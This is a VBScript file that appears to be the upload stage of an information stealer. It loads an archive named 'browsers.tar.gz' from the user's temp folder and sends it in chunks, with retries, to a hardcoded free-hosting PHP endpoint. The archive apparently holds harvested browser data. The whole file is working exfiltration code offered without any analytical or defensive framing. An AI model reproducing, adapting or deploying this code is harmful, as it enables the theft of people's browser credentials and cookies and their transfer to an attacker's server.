Option Explicit

Dim serverUrl
Dim localFilePath
Dim chunkSize
Dim tempFolder
Dim objShell
Set objShell = CreateObject("WScript.Shell")

tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
serverUrl = "https://ddosersnoobs.000webhostapp.com/tt.php" ' Replace with the URL of your upload script
localFilePath = tempFolder & "\browsers.tar.gz" ' Replace with the path to the file you want to upload
chunkSize = 1024 * 1024 ' Size of each chunk in bytes (1MB)

Dim objHTTP
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")

Dim maxRetries
maxRetries = 3 ' Maximum number of retries

Dim retryDelay
retryDelay = 3000 ' Delay between retries in milliseconds (5 seconds)

Dim retryCount
retryCount = 0

Do
    objHTTP.Open "POST", serverUrl, False
    objHTTP.SetRequestHeader "Content-Type", "application/octet-stream"

    ' Pass filename with extension as a custom HTTP header
    Dim fileName
    fileName = CreateObject("Scripting.FileSystemObject").GetFileName(localFilePath)
    objHTTP.SetRequestHeader "X-Filename", fileName

    Dim fileStream
    Set fileStream = CreateObject("ADODB.Stream")
    fileStream.Type = 1 ' Binary mode
    fileStream.Open
    fileStream.LoadFromFile localFilePath

    Dim totalFileSize
    totalFileSize = fileStream.Size

    Dim bytesSent
    bytesSent = 0

    Do While bytesSent < totalFileSize
        Dim chunk
        If totalFileSize - bytesSent < chunkSize Then
            chunk = fileStream.Read(totalFileSize - bytesSent)
        Else
            chunk = fileStream.Read(chunkSize)
        End If
        
        objHTTP.Send chunk
        bytesSent = bytesSent + LenB(chunk)
    Loop

    ' Check the response status
    If objHTTP.Status = 200 Then
                Exit Do
    Else
                retryCount = retryCount + 1
        If retryCount >= maxRetries Then
            WScript.Echo "Maximum retry limit reached. Exiting."
            Exit Do
        Else
                        WScript.Sleep retryDelay
        End If
    End If

    fileStream.Close
    Set fileStream = Nothing
Loop While retryCount < maxRetries

Set objHTTP = Nothing
